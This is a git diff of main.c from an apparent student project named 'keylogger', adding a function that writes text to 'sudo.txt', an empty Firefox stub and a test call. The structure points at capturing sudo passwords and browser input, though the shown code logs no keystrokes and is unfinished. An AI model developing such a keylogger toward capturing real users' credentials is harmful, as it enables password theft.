@@ -1,15 +1,20 @@
 /*
 ** main.c for keylogger in /home/azword/delivery/Perso/PSU/Keylogger
-** 
+**
 ** Made by Nathan Tréhout | Az'
 ** Login   <nathan.trehout@epitech.eu>
-** 
+**
 ** Started on  Mon Dec 19 16:49:34 2016 Nathan Trehout
-** Last update Mon Dec 19 17:38:50 2016 Nathan Trehout
+** Last update Tue Dec 20 19:06:39 2016 Nathan Tréhout
 */
 
-#include "include/my.h"
-#include "include/struct.h"
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <linux/input.h>
+#include <string.h>
+#include <stdio.h>
 
 int	is_prefix(char *p)
 {
@@ -21,17 +26,35 @@ int	is_prefix(char *p)
     return (84);
 }
 
-int	init(char *path, char *to_write, char *prefix)
+int	write_sudo(char *prefix, char *to_write)
+{
+  FILE *file;
+
+
+  file = fopen("sudo.txt", "w");
+  fputs(to_write, file);
+
+}
+
+int	write_firefox(char *prefix, char *to_write)
+{
+
+}
+
+int	init(char *to_write, char *prefix)
 {
   if (is_prefix(prefix) == 1)
-    write_sudo(
-  
+    write_sudo(prefix, to_write);
+  else if (is_prefix(prefix) == 2)
+    write_firefox(prefix, to_write);
+  else
+    return (84);
   return (0);
 }
 
 
 int	main()
 {
-  is_prefix("sudo");
+  init("salut tout le monde !", "sudo");
   return (0);
 }
